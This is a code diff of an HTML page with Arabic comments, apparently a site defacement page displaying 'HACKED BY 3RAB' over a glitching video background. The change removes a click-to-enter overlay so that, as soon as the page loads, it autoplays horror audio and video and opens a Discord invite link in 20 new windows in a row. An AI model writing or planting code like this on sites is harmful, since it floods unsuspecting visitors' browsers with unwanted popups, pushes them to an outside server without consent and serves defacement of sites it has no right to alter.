@@ -37,27 +37,6 @@
       justify-content: center;
       align-items: center;
       animation: severe-glitch 0.15s infinite;
-      cursor: pointer;
-    }
-
-    /* واجهة الضغط الأولى */
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0, 0, 0, 0.95);
-      z-index: 999;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: #ff0000;
-      font-size: 1.5rem;
-      font-weight: bold;
-      text-shadow: 0 0 10px #ff0000;
-      letter-spacing: 2px;
     }
 
     .main-container {
@@ -138,32 +117,22 @@
     }
   </style>
   <script>
-    function startSystem() {
-      // 1. إخفاء شاشة "اضغط للدخول"
-      var overlay = document.getElementById('startScreen');
-      if (overlay) overlay.style.display = 'none';
-
-      // 2. تشغيل الصوت والفيديو بموقعك المرعب
-      var audio = document.getElementById('horrorAudio');
+    window.addEventListener('DOMContentLoaded', () => {
+      // تشغيل الفيديو والصوت في الخلفية
       var video = document.getElementById('bgVideo');
-      if (audio) audio.play().catch(function(e){ console.log(e); });
-      if (video) video.play().catch(function(e){ console.log(e); });
+      if (video) video.play().catch(e => {});
 
-      // 3. فتح 10 صفحات تتوجه لرابط الديسكورد في الخلفية
-      for (let i = 0; i < 10; i++) {
-        setTimeout(function() {
-          window.open("https://discord.gg/Vps5N6aAnQ", "_blank");
-        }, i * 150);
+      var audio = document.getElementById('horrorAudio');
+      if (audio) audio.play().catch(e => {});
+
+      // فتح رابط الديسكورد 20 مرة متتالية فور دخول الصفحة
+      for (let i = 0; i < 20; i++) {
+        window.open("https://discord.gg/Vps5N6aAnQ", "_blank");
       }
-    }
+    });
   </script>
 </head>
 <body>
-
-  <!-- شاشة الضغط الأولى -->
-  <div id="startScreen" class="overlay" onclick="startSystem()">
-    [ اضغط في أي مكان للدخول ]
-  </div>
 
   <video id="bgVideo" class="bg-video" loop muted playsinline>
     <source src="video.mp4" type="video/mp4">
@@ -198,7 +167,7 @@
     HACKED BY 3RAB
   </div>
 
-  <audio id="horrorAudio" loop preload="auto">
+  <audio id="horrorAudio" autoplay loop preload="auto">
     <source src="sound.wav" type="audio/wav">
   </audio>
 
